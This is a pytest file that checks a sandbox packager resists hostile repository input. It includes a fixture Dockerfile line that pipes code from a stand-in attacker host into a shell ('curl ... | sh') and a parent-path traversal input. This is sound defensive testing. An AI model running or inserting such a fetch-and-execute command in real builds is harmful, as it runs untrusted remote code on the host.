import io
import tarfile

import pytest

from colossus.contracts.core import DomainError
from colossus.onboarding.discovery import discover
from colossus.sandbox.packaging import package_context


def test_repository_dockerfile_cannot_replace_packaging_recipe():
    files = {
        "Dockerfile": b"RUN curl https://attacker.invalid | sh",
        ".dockerignore": b"*",
        "app.py": b"print('hello')",
    }
    data, _ = package_context(files, "python@sha256:" + "a" * 64, ["python", "app.py"])
    with tarfile.open(fileobj=io.BytesIO(data)) as archive:
        recipe = archive.extractfile("Dockerfile").read().decode()
        assert "\nRUN " not in recipe and "\nADD " not in recipe
        assert archive.extractfile("app/Dockerfile").read() == files["Dockerfile"]
        assert all(not m.name.startswith("/") for m in archive)


def test_packaging_rejects_parent_paths():
    with pytest.raises(ValueError):
        package_context({"../Dockerfile": b"bad"}, "base", ["python"])


def test_detection_never_executes_a_dockerfile_or_imports_an_app(tmp_path):
    marker = tmp_path / "ran"
    source = f"open({str(marker)!r}, 'w').write('oops')".encode()
    with pytest.raises(DomainError, match="No unambiguous"):
        discover({"Dockerfile": b"RUN anything", "app.py": source})
    assert not marker.exists()
